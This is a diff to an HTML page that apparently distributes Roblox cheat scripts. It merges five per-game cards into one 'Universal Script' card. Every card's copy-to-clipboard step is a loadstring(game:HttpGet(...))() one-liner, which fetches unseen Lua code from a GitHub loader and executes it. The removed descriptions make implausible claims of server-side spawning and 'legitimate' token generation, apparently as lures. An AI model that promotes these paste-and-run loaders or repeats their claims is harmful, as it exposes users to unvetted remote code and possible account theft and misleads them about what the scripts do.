@@ -155,10 +155,10 @@ body {
 .container {
   position: relative;
   z-index: 10;
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-  gap: 30px;
-  max-width: 1200px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  max-width: 900px;
   margin: 0 auto;
   padding: 40px 20px 80px;
 }
@@ -174,6 +174,8 @@ body {
   overflow: hidden;
   transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
   cursor: pointer;
+  width: 100%;
+  max-width: 800px;
 }
 
 .card::before {
@@ -226,12 +228,88 @@ body {
   text-shadow: 0 2px 10px rgba(255, 255, 255, 0.3);
 }
 
-.card-description {
-  color: #aaa;
+.code-container {
+  background: rgba(10, 10, 10, 0.9);
+  border-radius: 16px;
+  padding: 25px;
+  margin: 25px 0;
+  border: 1px solid rgba(255, 107, 107, 0.3);
+  box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+  overflow-x: auto;
+}
+
+.code-container pre {
+  margin: 0;
+  text-align: left;
+}
+
+.code-container code {
+  font-family: 'Courier New', monospace;
   font-size: 0.95em;
-  margin-bottom: 25px;
   line-height: 1.6;
-  font-weight: 300;
+  color: #fff;
+  white-space: pre;
+  display: block;
+}
+
+.lua-keyword {
+  color: #ff6b6b;
+  font-weight: 600;
+}
+
+.lua-function {
+  color: #4dabf7;
+}
+
+.lua-string {
+  color: #51cf66;
+}
+
+.lua-bracket {
+  color: #ffd43b;
+}
+
+.lua-operator {
+  color: #ff8787;
+}
+
+.supported-games {
+  margin-top: 30px;
+  padding-top: 25px;
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  text-align: left;
+}
+
+.supported-games h3 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.3em;
+  color: #ff6b6b;
+  margin-bottom: 15px;
+  text-align: center;
+}
+
+.supported-games ul {
+  list-style: none;
+  padding: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.supported-games li {
+  color: #ccc;
+  font-size: 1.05em;
+  padding: 8px 15px;
+  background: rgba(255, 107, 107, 0.05);
+  border-radius: 8px;
+  transition: all 0.3s ease;
+  border-left: 3px solid rgba(255, 107, 107, 0.3);
+}
+
+.supported-games li:hover {
+  background: rgba(255, 107, 107, 0.1);
+  border-left-color: #ff6b6b;
+  transform: translateX(5px);
 }
 
 .card button {
@@ -344,6 +422,15 @@ body {
   color: #ff6b6b;
 }
 
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.card {
+  animation: fadeIn 0.6s ease forwards;
+}
+
 @media (max-width: 768px) {
   .header {
     padding: 40px 15px 30px;
@@ -359,14 +446,34 @@ body {
   }
   
   .container {
-    grid-template-columns: 1fr;
-    gap: 15px;
+    flex-direction: column;
     padding: 20px 15px 50px;
   }
   
   .card {
     padding: 25px 20px;
     border-radius: 18px;
+    max-width: 100%;
+  }
+
+  .code-container {
+    padding: 15px;
+    margin: 20px 0;
+    overflow-x: scroll;
+  }
+
+  .code-container code {
+    font-size: 0.75em;
+    white-space: nowrap;
+  }
+
+  .supported-games h3 {
+    font-size: 1.1em;
+  }
+
+  .supported-games li {
+    font-size: 0.95em;
+    padding: 6px 12px;
   }
 
   .card-icon {
@@ -380,12 +487,6 @@ body {
   .card h2 {
     font-size: 1.4em;
     margin-bottom: 10px;
-  }
-
-  .card-description {
-    font-size: 0.85em;
-    margin-bottom: 20px;
-    line-height: 1.5;
   }
   
   .card button {
@@ -414,20 +515,6 @@ body {
     font-size: 0.9em;
   }
 }
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-.card {
-  animation: fadeIn 0.6s ease forwards;
-}
-
-.card:nth-child(1) { animation-delay: 0.1s; }
-.card:nth-child(2) { animation-delay: 0.2s; }
-.card:nth-child(3) { animation-delay: 0.3s; }
-.card:nth-child(4) { animation-delay: 0.4s; }
 </style>
 </head>
 <body>
@@ -443,41 +530,23 @@ body {
 <div class="notification" id="notification">Script Copied Successfully</div>
 
 <div class="container">
-  <div class="card">
-    <div class="card-icon">🌱</div>
-    <h2>Grow a Garden</h2>
-    <p class="card-description">Grow a Garden Script offers true Server-Side Pet, Seed, and Fruit Spawning with Real In-game Effects.It includes a Powerful Token Spawner that Generates legitimate Tokens.Use them to buy any pet you want and progress instantly.</p>
-    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/GrowAGarden'))()`, this)">Copy Script</button>
-  </div>
-
-  <div class="card">
-    <div class="card-icon">🔪</div>
-    <h2>Murder Mystery 2</h2>
-    <p class="card-description">Features a Powerful Spawner and advanced Auto Farm for Coins and XP, offering fast, Reliable Automation to dominate Murder Mystery 2 with ease.</p>
-    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/MurderMystery'))()`, this)">Copy Script</button>
-  </div>
-  
-  <div class="card">
-    <div class="card-icon">🐉</div>
-    <h2>Adopt Me</h2>
-    <p class="card-description">Spawn Pets and Cash instantly in Adopt Me! Keyless, Fast, and Undetected — get Rare pets and extra Cash!</p>
-    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/AdoptMe'))()`, this)">Copy Script</button>
-  </div>
-
-  <div class="card">
-    <div class="card-icon">🧠</div>
-    <h2>Steal A Brainrot</h2>
-    <p class="card-description">A comprehensive Script featuring a built-in Spawner, Instant-Steal functionality, and fully Customizable Brainrot controls — all designed for seamless integration and professional gameplay use.</p>
-    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/StealABrainrot'))()`, this)">Copy Script</button>
-  </div>
-</div>
-
-<div class="card">
-    <div class="card-icon">🐟</div>
-    <h2>My Fishing Brainrot</h2>
-    <p class="card-description">Boosts your progress by automating tedious tasks like Auto Claim, Auto Spawn Egg, Egg Finder, and Auto Buy Food.
-Spend less time grinding and more time enjoying the game.</p>
-    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/MyFishingBrainrot'))()`, this)">Copy Script</button>
+  <div class="card code-card">
+    <div class="card-icon">📜</div>
+    <h2>Universal Script</h2>
+    <div class="code-container">
+      <pre><code><span class="lua-keyword">loadstring</span><span class="lua-bracket">(</span><span class="lua-function">game</span><span class="lua-operator">:</span><span class="lua-function">HttpGet</span><span class="lua-bracket">(</span><span class="lua-string">"https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/Universel"</span><span class="lua-bracket">))()</span></code></pre>
+    </div>
+    <button onclick="copyToClipboard(`loadstring(game:HttpGet('https://raw.githubusercontent.com/Ankazxc/Loader/refs/heads/main/Universel'))()`, this)">Copy Script</button>
+    <div class="supported-games">
+      <h3>Game Supported:</h3>
+      <ul>
+        <li>🌱 Grow a Garden</li>
+        <li>🐉 Adopt Me</li>
+        <li>🔪 Murder Mystery 2</li>
+        <li>🧠 Steal a Brainrot</li>
+        <li>🐟 My Fishing Brainrot</li>
+      </ul>
+    </div>
   </div>
 </div>
 
